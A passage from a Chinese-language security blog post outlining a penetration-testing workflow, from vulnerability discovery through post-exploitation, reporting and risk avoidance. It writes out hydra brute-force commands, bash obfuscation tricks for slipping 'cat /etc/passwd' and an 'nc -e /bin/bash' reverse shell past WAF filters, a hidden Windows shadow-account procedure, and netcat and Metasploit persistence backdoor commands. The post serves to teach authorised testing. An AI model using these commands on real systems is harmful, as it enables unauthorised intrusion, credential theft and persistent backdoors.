  <figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># hydra -L user.txt -P pass.txt -f -v -t 20 mssql:<span class="comment">//192.168.1.2</span></span></span><br><span class="line"><span class="meta"># hydra -l root -P pass.txt -f -v -t 20 mysql:<span class="comment">//192.168.1.2</span></span></span><br><span class="line"><span class="meta"># hydra -L user.txt -P pass.txt -f -v -t 20 smb:<span class="comment">//192.168.1.2</span></span></span><br><span class="line"><span class="meta"># hydra -L user.txt -P pass.txt -f -v -t 20 postgres:<span class="comment">//192.168.1.2</span></span></span><br><span class="line"><span class="meta"># hydra -L user.txt -P pass.txt -f -v -t 20 rdp:<span class="comment">//192.168.1.2</span></span></span><br><span class="line"><span class="meta"># hydra -l root -P pass.txt -f -v -t 20 ssh:<span class="comment">//192.168.1.2</span></span></span><br><span class="line"><span class="meta"># hydra -L user.txt -P pass.txt -f -v -t 20 ftp:<span class="comment">//192.168.1.2</span></span></span><br></pre></td></tr></table></figure>
</li>
<li><p>越权访问</p>
<p>  越权访问又包括水平越权和垂直访问，这种漏洞我们可以观察url是否带有用户的明文信息或者直接访问一些敏感页面</p>
</li>
<li><p>各种框架漏洞</p>
<p>  比如说structs这个框架的漏洞层出不穷，当明确了目标所使用何种框架之后，我们可以使用poc进行验证</p>
</li>
<li><p>信息泄露</p>
<p>  信息泄露即通过各种搜索手段或者查看robots.txt之类的敏感目录得到敏感信息</p>
</li>
<li><p>文件包含</p>
<p>  当我们在遇到文件上传并且有白名单校验的时候，利用文件包含可以轻松getshell</p>
<p>  远程文件包含拿shell，本地包含读取文件</p>
</li>
<li><p>命令执行</p>
<p>  <strong>定义</strong>：针对操作系统，即能够在服务器上执行任意命令。从Web应用中通过Shell来调用操作系统命令，如果在Shell调用时存在漏洞，就可以执行攻击者的非法OS命令<br><br>  命令注入的思路与sql注入思路是差不多的，都是对用户的输入过滤不严谨。<br></p>
<p>  <strong>调用系统命令</strong></p>
<p>  如何防止OS注入：<br></p>
<ul>
<li>不调用外部程序；</li>
<li>过滤掉、；，[,],|,&lt;,&gt;,\之类的符号；</li>
<li><p>设置用户的权限。</p>
<p>linux命令执行绕过过滤/waf技巧</p>
<p>主要利用了bash的通配符、连接符、未初始化的变量三个特性来绕过WAF规则</p>
</li>
<li><p>通配符<br>  在bash的操作环境中有一个非常有用的功能，那就是通配符，下面列出一些常用的通配符：</p>
  <figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*    代表『 <span class="selector-tag">0</span> 个到无穷多个』任意字符</span><br><span class="line">?    代表『一定有一个』任意字符</span><br><span class="line"><span class="selector-attr">[ ]</span>    同样代表『一定有一个在括号内』的字符(非任意字符)。例如 <span class="selector-attr">[abcd]</span> 代表『一定有一个字符， 可能是 <span class="selector-tag">a</span>, <span class="selector-tag">b</span>, <span class="selector-tag">c</span>, <span class="selector-tag">d</span> 这四个任何一个』</span><br><span class="line"><span class="selector-attr">[ - ]</span>    若有减号在中括号内时，代表『在编码顺序内的所有字符』。例如 <span class="selector-attr">[0-9]</span> 代表 <span class="selector-tag">0</span> 到 <span class="selector-tag">9</span> 之间的所有数字，因为数字的语系编码是连续的！</span><br><span class="line"><span class="selector-attr">[^ ]</span>    若中括号内的第一个字符为指数符号 (^) ，那表示『反向选择』，例如 <span class="selector-attr">[^abc]</span> 代表 一定有一个字符，只要是非 <span class="selector-tag">a</span>, <span class="selector-tag">b</span>, <span class="selector-tag">c</span> 的其他字符就接受的意思。</span><br></pre></td></tr></table></figure>
<p>  比如可以使用</p>
<p>  <code>ls -l</code> 替换成<code>/?in/?s -l</code> <br><br>  <code>cat /etc/passwd</code> 替换成 <code>/?in/cat /?tc/p?sswd</code> <br><br>  <code>nc -e /bin/bash 127.0.0.1 3737</code> 替换成 <code>/??n/?c -e /??n/b??h 2130706433 3737</code></p>
</li>
<li><p>连接符<br>  在bash的操作环境中还有一个非常有用的功能，那就是连接符，需要注意的就是闭合，这点很重要，利用这个我们可以绕过一些匹配字符串的WAF规则</p>
<p>  <code>cat /etc/passwd</code> 替换成 <code>/&#39;b&#39;i&#39;n&#39;/&#39;c&#39;a&#39;t&#39; /&#39;e&#39;t&#39;c&#39;/&#39;p&#39;a&#39;s&#39;s&#39;w&#39;d</code><br><br>  <code>which nc</code> 替换成 <code>/&#39;b&#39;i&#39;n&#39;/&#39;w&#39;h&#39;i&#39;c&#39;h&#39; &#39;n&#39;c</code><br><br>  <code>which wget</code> 替换成 <code>/&#39;b&#39;i&#39;n&#39;/&#39;w&#39;h&#39;i&#39;c&#39;h&#39; &#39;w&#39;g&#39;e&#39;t</code><br><br>  双引号<code>/&quot;b&quot;i&quot;n&quot;/&quot;w&quot;h&quot;i&quot;c&quot;h&quot; &quot;n&quot;c</code><br><br>  反斜杠<code>/b\i\n/w\h\i\c\h n\c</code></p>
</li>
<li><p>未初始化的bash变量<br>  在bash环境中允许我们使用未初始化的bash变量，未初始化的变量值都是null。</p>
<p>  $a,$b,$c</p>
<p>  <code>cat$a /etc$a/passwd$a</code><br>  <code>/bin$s/nc$s -e /bin$s/bash$s 2130706433 3737</code></p>
</li>
</ul>
</li>
</ul>
<ul>
<li><p>SSRF</p>
<p>  ServerSide Request Forgery 的简写，允许 Web Interface 请求受保护网络内的资源。</p>
</li>
<li><p>参数</p>
<p>  参数超长是否导致溢出、参数有特殊字符是否会导致程序报错、参数确实是否导致程序报错</p>
</li>
<li><p>业务漏洞检测</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>阶段</th>
<th>功能</th>
<th>功能对应检测点</th>
</tr>
</thead>
<tbody>
<tr>
<td>身份认证</td>
<td>用户注册</td>
<td>是否可以重复注册</td>
</tr>
<tr>
<td>身份认证</td>
<td>密码修改</td>
<td>修改密码逻辑是否有问题</td>
</tr>
<tr>
<td>身份认证</td>
<td>密码重置</td>
<td>重置密码逻辑是否有问题</td>
</tr>
<tr>
<td>身份认证</td>
<td>短信验证码</td>
<td>短信炸弹，逻辑是否有问题、是否可爆破</td>
</tr>
<tr>
<td>身份认证</td>
<td>图片验证码</td>
<td>验证码是否可重复使用</td>
</tr>
<tr>
<td>身份认证</td>
<td>登录</td>
<td>登录逻辑是否有问题</td>
</tr>
<tr>
<td>会话管理</td>
<td>登录</td>
<td>会话ID生成机制是否有问题</td>
</tr>
<tr>
<td>会话管理</td>
<td>登录</td>
<td>是否有超时自动退出机制</td>
</tr>
<tr>
<td>会话管理</td>
<td>退出</td>
<td>退出后会话ID是否真的失效</td>
</tr>
<tr>
<td>访问控制</td>
<td>用户信息查看</td>
<td>是否可以水平越权访问其他用户页面</td>
</tr>
<tr>
<td>访问控制</td>
<td>具有管理员界面</td>
<td>是否可以垂直越权访问管理员页面</td>
</tr>
<tr>
<td>访问控制</td>
<td>具有管理员接口</td>
<td>普通用户直接发包是否也会响应</td>
</tr>
<tr>
<td>业务逻辑</td>
<td>购买</td>
<td>修改价格后端是否会再次校验</td>
</tr>
<tr>
<td>业务逻辑</td>
<td>多步功能</td>
<td>是否跳过其中某些步骤</td>
</tr>
<tr>
<td>业务逻辑</td>
<td>请求次数限制</td>
<td>服务端如何限制是否可以绕过，条件竞争</td>
</tr>
</tbody>
</table>
<p>最后需要注意的是在进行漏洞发现的时候应该对每一个事件利用burpsuite进行抓包仔细观察数据包的传送情况，不放过任何一个可利用的点。</p>
<h2 id="0x04-漏洞验证"><a href="#0x04-漏洞验证" class="headerlink" title="0x04 漏洞验证"></a>0x04 漏洞验证</h2><p>尽可能的由浅入深，旁敲侧推，尽可能的将漏洞的价值发挥到最大化，比如说挖到一枚self-xss ，这个漏洞一般会被忽略，如果说结合csrf漏洞的话那么就是一个中危漏洞了<br><br>再比如说拿到一个企业的邮箱账户，我们可以对其vpn爆破然后进行内网探测等等都是可行的。</p>
<h2 id="0x05-后渗透阶段"><a href="#0x05-后渗透阶段" class="headerlink" title="0x05 后渗透阶段"></a>0x05 后渗透阶段</h2><p>后渗透测试包括内网渗透，权限维持，权限提升，读取用户hash，浏览器密码等等，一般都是点到为止，不会深入。<strong>这里需要注意，是要在客户允许的范围内进行测试，白帽子需要有白帽子的底线！</strong> </p>
<ul>
<li><p>提权</p>
<p>  提权方便进行内网渗透</p>
<ul>
<li><p>系统漏洞提权</p>
<ul>
<li><strong>Windows平台：</strong> 可以通过systeminfo查看系统版本和补丁记录，或使用提权辅助工具<a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester" target="_blank" rel="noopener">Windows-Exploit-Suggester</a>，参考<a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">SecWiki/windows-kernel-exploits</a></li>
<li><strong>Linux平台:</strong> uname -a 查看系统内核版本，如脏牛漏洞，参考<a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">SecWiki/linux-kernel-exploits</a></li>
<li><strong>MacOS平台:</strong> 参考<a href="https://github.com/SecWiki/macos-kernel-exploits" target="_blank" rel="noopener">SecWiki/macos-kernel-exploits</a></li>
</ul>
</li>
<li><p>数据库提权</p>
<p>  利用数据库系统命令执行获取shell，或数据库漏洞如<a href="https://www.cnblogs.com/coderlee/archive/2009/07/18/1526229.html" target="_blank" rel="noopener">mssql的job提权</a>、<a href="https://www.cnblogs.com/wh4am1/p/6613770.html" target="_blank" rel="noopener">mysql的mof提权</a></p>
</li>
<li><p>web中间件漏洞提权</p>
<p>  IIS溢出、tomcat提权</p>
</li>
<li><p>第三方软件提权</p>
<p>  Filezllia提权、搜狗拼音提权</p>
</li>
<li><p>系统错误配置提权</p>
<p>  在windows下可以使用BeRoot工具进行系统配置检查，利用配置错误点进行提权。 </p>
</li>
<li><p>获取或嗅探高权限账号提权</p>
<p>  利用LaZagne project（支持linux、windows、mac），可以抓取chats、mails、database、wifi、sysadmin、wallet、browsers、memory中的密码，可以利用抓取到的密码进行高权限帐号密码测试，也可以利用神器mimikatz和mimipenguin，不过在部分时候由于权限问题可能读取不到部分密码。 </p>
</li>
</ul>
</li>
<li><p>权限维持</p>
<p>  当我们在渗透过程中通过漏洞获取到目标主机权限后，往往会因为服务器管理员发现和修补漏洞而导致对服务器权限的丢失，所以权限维持就显得很重要了。</p>
<ul>
<li>构造隐蔽的WEB漏洞方式维持权限，如文件包含漏洞</li>
<li>webshell</li>
<li><p>账号维权，获取用户名密码，或自建隐藏账号 </p>
<p>  Window 影子账号创建</p>
  <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 通过net<span class="built_in"> user </span>xxx$ 123 /<span class="builtin-name">add</span> </span><br><span class="line">2. 打开注册表，找到HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users/，双击Administrator记住类型下面的十六进制值0x1f4找到左侧对应得文件夹即000001F4，双击打开复制里面F下的所有内容。 将内容复制到xxx$ 对应的文件夹下面，然后将xxx$ 和00000XXX 导出注册表</span><br><span class="line">3. 接着删除xxx$ 用户 net<span class="built_in"> user </span>xxx$ /del</span><br><span class="line">4. 双击导入刚才导出的两个注册表</span><br></pre></td></tr></table></figure>
</li>
<li><p>常用的远程控制软件</p>
<ul>
<li><a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="noopener">msf</a> </li>
<li>nc </li>
<li><a href="https://github.com/EmpireProject/Empire" target="_blank" rel="noopener">PowerShell Empire</a> </li>
<li><a href="https://github.com/zerosum0x0/koadic" target="_blank" rel="noopener">大宝剑Koadic</a> </li>
<li><a href="https://cobaltstrike.com/" target="_blank" rel="noopener">Cobalt strike</a> </li>
<li><a href="https://github.com/n1nj4sec/pupy" target="_blank" rel="noopener">Pupy</a></li>
<li><a href="https://github.com/nettitude/PoshC2" target="_blank" rel="noopener">PoshC2</a></li>
<li><a href="https://github.com/byt3bl33d3r/gcat" target="_blank" rel="noopener">Gcat</a></li>
<li><a href="https://github.com/trustedsec/trevorc2" target="_blank" rel="noopener">TrevorC2</a></li>
<li><a href="https://github.com/Ne0nd0g/merlin" target="_blank" rel="noopener">Merlin</a></li>
<li><a href="https://github.com/quasar/QuasarRAT" target="_blank" rel="noopener">Quasar</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<pre><code>nc

<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">服务器监听<span class="number">4444</span>端口 nc -lvvp <span class="number">4444</span></span><br><span class="line"></span><br><span class="line">目标执行 nc -t -e cmd<span class="selector-class">.exe</span> x<span class="selector-class">.x</span><span class="selector-class">.x</span><span class="selector-class">.x</span> <span class="number">4444</span> ，并添加开机启动</span><br></pre></td></tr></table></figure>

msf
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">先获得一个Meterpretershell</span><br><span class="line">利用 Persistence模块</span><br><span class="line"><span class="keyword">run</span><span class="bash"> persistence -U -i 10 -p 4444 -r x.x.x.x</span></span><br><span class="line"><span class="bash"></span></span><br><span class="line"><span class="bash">    -U：设置后门在用户登录后自启动。该方式会在HKCU\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息。推荐使用该参数；</span></span><br><span class="line"><span class="bash">    -i：设置反向连接间隔时间，单位为秒；</span></span><br><span class="line"><span class="bash">    -p：设置反向连接的端口号；</span></span><br><span class="line"><span class="bash">    -r：设置反向连接的ip地址。</span></span><br><span class="line"><span class="bash"></span></span><br><span class="line"><span class="bash">Metsvc 模块</span></span><br><span class="line"><span class="bash"></span></span><br><span class="line"><span class="bash">run metsvc -A</span></span><br><span class="line"><span class="bash">直接在目标主机上开启一个服务</span></span><br><span class="line"><span class="bash">利用handler下的windows/metsvc_bind_tcp模块，重新获得shell</span></span><br></pre></td></tr></table></figure>
</code></pre><ul>
<li><p>内网渗透</p>
<p>  内网渗透通常是拿下某个内网访问权限后在内网中渗透，在企业的网络建设里，有些数据资源需要保护起来，于是选择放在内网，这是一点，还有一点跟互联网地址空间、资金有关，于是NAT地址转换、端口转发技术应用的越来越多，形成了一个网关、N台服务器的形式，当某个对外服务被黑客入侵，那么黑客还会使用这个缺口继续深入，但是内网中的网络管理安全强度并没有外网那么严谨，导致Wannacry、震网等病毒统治内网，还有就是内网的服务、服务器大多采用默认配置，这并不是一个非常安全的方案，可并未重视起来。</p>
<p>  网络拓扑探测</p>
<pre><code>安全域、防火墙、ids/ips
</code></pre><p>  内网弱口令<br>  内网服务器漏洞<br>  内网网络设备漏洞<br>  内网个人终端漏洞</p>
<pre><code>系统层ms17-010等   office漏洞     
</code></pre><p>  内网钓鱼<br>  中间人攻击<br>  内网穿透</p>
</li>
</ul>
<h2 id="0x06-报告编写"><a href="#0x06-报告编写" class="headerlink" title="0x06 报告编写"></a>0x06 报告编写</h2><p>一个好的渗透测试报告至关重要。<br>只有编写完渗透测试报告这次渗透测试才算完全结束。<br><br>首先你需要明确漏洞名称以及漏洞原理。<br>其次要注明参与人员，测试时间，内网外网<br></p>
<ul>
<li>按需整理：按照之前第一步跟客户确定好的范围，需求来整理资料，并将资料形成报告</li>
<li>补充介绍：要对漏洞成因，验证过程和带来危害进行分析</li>
<li>修补建议：当然要对所有产生的问题提出合理高效安全的解决办法</li>
</ul>
<h2 id="0x07-风险规避"><a href="#0x07-风险规避" class="headerlink" title="0x07 风险规避"></a>0x07 风险规避</h2><ol>
<li>不要进行诸如ddos攻击，不破坏数据</li>
<li>测试之前对重要数据进行备份</li>
<li>任何测试执行前必须和客户进行沟通，以免引来不必要的麻烦</li>
<li>可以对原始系统生成镜像环境，然后对镜像环境进行测试</li>
<li>明确渗透测试范围</li>
</ol>
-->
      

    </div>


    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>


    <footer class="article-footer">
      
        <a data-url="http://www.pa55w0rd.club/渗透测试/" data-id="cjqouf1im00815nt6dc5c47vk" class="article-share-link" data-share="baidu" data-title="渗透测试流程">分享到</a>
      

      
        <a href="http://www.pa55w0rd.club/渗透测试/#gitalk-container" class="article-comment-link">留言</a>
      

      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/信息收集/">信息收集</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/内网渗透/">内网渗透</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透测试/">渗透测试</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞利用/">漏洞利用</a></li></ul>


    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/centos7_install_docker/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">← 上一篇</strong>
      <div class="article-nav-title">centos7 安装使用docker</div>
    </a>
  
  
    <a href="/解析漏洞/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">下一篇 →</strong>
      <div class="article-nav-title">
        
          解析漏洞
        
      </div>
    </a>
  
</nav>


  
</article>
<!--
<div class="share-component" data-disabled="" data-description="Share.js - 一键分享到微博，QQ空间，腾讯微博，人人，豆瓣">一键分享</div>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
-->


  <section class="comments">
    <div id="disqus_thread">
      <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
    </div>
  </section> 




  <script type="text/javascript">document.write(unescape("%3Cdiv id='reward' %3E%3C/div%3E%3Cscript src='/js/reward.min.js' type='text/javascript'%3E%3C/script%3E"));</script>
  <div id="gitalk-container"></div>


</section>
      
      <aside id="sidebar">
  
    
  <div class="widget-wrap">

    <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s"><i class="fa fa-file-text-o"></i>近期文章</h3>
    <div class="widget">
      <ul>
        
          <li onclick="javascript:document.getElementById('recentpost_item').click();">
            <a id="recentpost_item" href="/sonar/">Docker部署sonar</a>
          </li>
        
          <li onclick="javascript:document.getElementById('recentpost_item').click();">
            <a id="recentpost_item" href="/docker1/">修改正在运行的docker容器的端口映射</a>
          </li>
        
          <li onclick="javascript:document.getElementById('recentpost_item').click();">
            <a id="recentpost_item" href="/insight/">insight洞察-漏洞生命周期管理使用</a>
          </li>
        
          <li onclick="javascript:document.getElementById('recentpost_item').click();">
            <a id="recentpost_item" href="/firewall/">Centos 7 使用firewalld防火墙</a>
          </li>
        
          <li onclick="javascript:document.getElementById('recentpost_item').click();">
            <a id="recentpost_item" href="/burp/">Burp Suite使用</a>
          </li>
        
      </ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s"><i class="fa fa-tasks"></i>分类</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/note/">note</a><span class="category-list-count">25</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web安全/">web安全</a><span class="category-list-count">13</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全建设/">安全建设</a><span class="category-list-count">12</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/应急响应/">应急响应</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/开发安全/">开发安全</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/移动安全/">移动安全</a><span class="category-list-count">3</span></li></ul>
    </div>
  </div>


  <script>
  $(document).on("click", "ul.category-list li.category-list-item", function () {
    window.location.href = $(this).find('a').attr('href')
  })
  </script>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s"><i class="fa fa-cloud"></i>标签云</h3>
    <div class="widget tagcloud">
      <a href="/tags/Android/" style="font-size: 11.67px;">Android</a> <a href="/tags/Android-安全测试-工具使用/" style="font-size: 10px;">Android - 安全测试 - 工具使用</a> <a href="/tags/HTTPS/" style="font-size: 10px;">HTTPS</a> <a href="/tags/PHPstudy/" style="font-size: 10px;">PHPstudy</a> <a href="/tags/TRS/" style="font-size: 10px;">TRS</a> <a href="/tags/algolia/" style="font-size: 10px;">algolia</a> <a href="/tags/checklist/" style="font-size: 11.67px;">checklist</a> <a href="/tags/docker/" style="font-size: 11.67px;">docker</a> <a href="/tags/hexo/" style="font-size: 13.33px;">hexo</a> <a href="/tags/iso27001/" style="font-size: 10px;">iso27001</a> <a href="/tags/linux/" style="font-size: 11.67px;">linux</a> <a href="/tags/mongodb/" style="font-size: 10px;">mongodb</a> <a href="/tags/sql/" style="font-size: 10px;">sql</a> <a href="/tags/sql注入/" style="font-size: 10px;">sql注入</a> <a href="/tags/web安全/" style="font-size: 15px;">web安全</a> <a href="/tags/windows-审计工具/" style="font-size: 10px;">windows 审计工具</a> <a href="/tags/xunfeng/" style="font-size: 10px;">xunfeng</a> <a href="/tags/业务安全/" style="font-size: 10px;">业务安全</a> <a href="/tags/代码扫描/" style="font-size: 10px;">代码扫描</a> <a href="/tags/信息收集/" style="font-size: 10px;">信息收集</a> <a href="/tags/内网安全/" style="font-size: 10px;">内网安全</a> <a href="/tags/内网渗透/" style="font-size: 10px;">内网渗透</a> <a href="/tags/前端加密/" style="font-size: 10px;">前端加密</a> <a href="/tags/名词解释/" style="font-size: 10px;">名词解释</a> <a href="/tags/基础知识/" style="font-size: 15px;">基础知识</a> <a href="/tags/基线加固/" style="font-size: 10px;">基线加固</a> <a href="/tags/备忘录/" style="font-size: 10px;">备忘录</a> <a href="/tags/安全建设/" style="font-size: 18.33px;">安全建设</a> <a href="/tags/安全架构/" style="font-size: 10px;">安全架构</a> <a href="/tags/安全规划/" style="font-size: 10px;">安全规划</a> <a href="/tags/安全规范/" style="font-size: 13.33px;">安全规范</a> <a href="/tags/安全设计/" style="font-size: 16.67px;">安全设计</a> <a href="/tags/安全设计评审/" style="font-size: 10px;">安全设计评审</a> <a href="/tags/安全评估/" style="font-size: 10px;">安全评估</a> <a href="/tags/安全运维/" style="font-size: 10px;">安全运维</a> <a href="/tags/安装使用/" style="font-size: 11.67px;">安装使用</a> <a href="/tags/工具使用/" style="font-size: 16.67px;">工具使用</a> <a href="/tags/平台建设/" style="font-size: 11.67px;">平台建设</a> <a href="/tags/应急响应/" style="font-size: 11.67px;">应急响应</a> <a href="/tags/开发安全/" style="font-size: 15px;">开发安全</a> <a href="/tags/开源工具/" style="font-size: 10px;">开源工具</a> <a href="/tags/技巧/" style="font-size: 11.67px;">技巧</a> <a href="/tags/指南/" style="font-size: 10px;">指南</a> <a href="/tags/操作记录/" style="font-size: 10px;">操作记录</a> <a href="/tags/数据库/" style="font-size: 10px;">数据库</a> <a href="/tags/渗透测试/" style="font-size: 10px;">渗透测试</a> <a href="/tags/漏洞利用/" style="font-size: 16.67px;">漏洞利用</a> <a href="/tags/漏洞管理/" style="font-size: 10px;">漏洞管理</a> <a href="/tags/移动安全/" style="font-size: 10px;">移动安全</a> <a href="/tags/等级保护/" style="font-size: 10px;">等级保护</a> <a href="/tags/红蓝对抗/" style="font-size: 10px;">红蓝对抗</a> <a href="/tags/解决方法/" style="font-size: 20px;">解决方法</a> <a href="/tags/记录/" style="font-size: 10px;">记录</a> <a href="/tags/资产扫描/" style="font-size: 10px;">资产扫描</a> <a href="/tags/迁移/" style="font-size: 10px;">迁移</a> <a href="/tags/速查表/" style="font-size: 10px;">速查表</a> <a href="/tags/非web型xss/" style="font-size: 10px;">非web型xss</a> <a href="/tags/验证码安全/" style="font-size: 10px;">验证码安全</a>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s"><i class="fa fa-archive"></i>归档</h3>
    <div class="widget">
      <!-- <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">一月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">十二月 2018</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">十一月 2018</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">十月 2018</a><span class="archive-list-count">25</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">九月 2018</a><span class="archive-list-count">13</span></li></ul> -->
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">2019年01月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">2018年12月</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">2018年11月</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">2018年10月</a><span class="archive-list-count">25</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">2018年09月</a><span class="archive-list-count">13</span></li></ul>
    </div>
  </div>


<script>
$(document).on("click", "ul.archive-list li.archive-list-item", function () {
  window.location.href = $(this).find('a').attr('href')
})
</script>

  
    
  <style>
  *{ margin: 0; padding: 0;}
  .tooltips{ border-width: 1px; border-style: solid; position: absolute; display: none; border-radius: 3px; opacity: 0; filter:alpha( opacity = 0) ; z-index: 999;}
  .tooltips p.content{ padding: 5px; }
  .tooltips .triangle-front,.tooltips .triangle-back{ width: 0; height: 0; overflow: hidden; border-width: 8px; border-style: solid; position: absolute; border-color: transparent ; top: 100%; left: 50%; margin-left: -8px;}
  .tooltips .triangle-back{ margin-top: -1px;}

  .toolTipInfo{ border-color: #000; background-color: #EEEEEE;}
  .toolTipInfo .triangle-front{ border-top-color: #EEEEEE;}
  .toolTipInfo .triangle-back{ border-top-color: #EEEEEE;}


  .icoSize{font-size: 2em}
  </style>



  <div class="widget-wrap">
    <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s"><i class="fa fa-link"></i>链接</h3>
    <div class="widget" style="z-index: 1;">





      <!-- <ul> -->
        
          <!-- <li> -->
          

          

                  <a id="github-alt-icon-color" class="weight-icon-link" target="_blank" href="https://github.com/Pa55w0rd">
                      <span class="fa-stack fa-lg">
                          <i class="fa fa-circle fa-stack-2x"></i>
                          <i class="fa fa-github-alt fa-stack-1x fa-inverse"></i>
                      </span>
                  </a>
          

          

          

          

          

          

          


          

          


          <!-- </li> -->
        
          <!-- <li> -->
          
            <a id="weixin-icon-color" class="weight-icon-link" href="javascript:;" target="_blank" tooltips="<img src='/img/weixin.png'>">
                <span class="fa-stack fa-lg">
                      <i class="fa fa-circle fa-stack-2x"></i>
                      <i class="fa fa-weixin  fa-stack-1x fa-inverse"></i>
                  </span>
              </a>
          

          

          

          

          

          

          

          


          

          


          <!-- </li> -->
        
          <!-- <li> -->
          
            <a id="qq-icon-color" class="weight-icon-link" href="javascript:;" target="_blank" tooltips="<img src='/img/qq.png'>">
                <span class="fa-stack fa-lg">
                      <i class="fa fa-circle fa-stack-2x"></i>
                      <i class="fa fa-qq  fa-stack-1x fa-inverse"></i>
                  </span>
              </a>
          

          

          

          

          

          

          

          


          

          


          <!-- </li> -->
        
          <!-- <li> -->
          

          

          

          

          

          

          

          


          
                  <a id="envelope-o-icon-color" class="weight-icon-link" target="_blank" href="mailto:pa55w0rd@aliyun.com" data-toggle="tooltip" data-placement="top" title="请多多交流！">
                  <span class="fa-stack fa-lg">
                          <i class="fa fa-circle fa-stack-2x"></i>
                          <i class="fa fa-envelope-o  fa-stack-1x fa-inverse"></i>
                      </span>
                  </a>
          

          


          <!-- </li> -->
        
      <!-- </ul> -->
    </div>
  </div>


  <script>
  $.fn.extend({
    hoverTips : function (){
      var self = $(this);
      var sw = self.get(0).switch;
      if( !sw ) {
        sw = true;
        var content = self.attr("tooltips");
        var htmlDom = $("<div class='tooltips'>")
            .addClass("toolTipInfo")
            .html("<p class='content'></p>"
                + "<p class='triangle-front'></p>"
                + "<p class='triangle-back'></p>");
        htmlDom.find("p.content").html( content );
      }
      self.on("mouseover",function(){
        $("body").append( htmlDom );
        var left = self.offset().left - htmlDom.outerWidth()/2 + self.outerWidth()/2;
        var top = self.offset().top - htmlDom.outerHeight() - parseInt(htmlDom.find(".triangle-front").css("border-width"));
        htmlDom.css({"left":left,"top":top - 10,"display":"block"});
        htmlDom.stop().animate({ "top" : top ,"opacity" : 1},300);
      });
      self.on("mouseout",function(){
        var top = parseInt(htmlDom.css("top"));
        htmlDom.stop().animate({ "top" : top - 10 ,"opacity" : 0},300,function(){
          htmlDom.remove();
          sw = false;
        });
      });
    },

  });

  $("#weixin-icon-color").hoverTips();
  $("#qq-icon-color").hoverTips();
  </script>



  
    
    <div class="widget-wrap">
  
      <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s"><i class="fa fa-group"></i>友链</h3>
      <div class="widget">
        <ul>
        
            <li onclick="javascript:document.getElementById('friend_links_item').click();">
              <a id="friend_links_item" href="https://firexun.github.io/"><i class="fa  fa-arrow-circle-right" style="margin-right:7px"></i>青衫磊落</a>
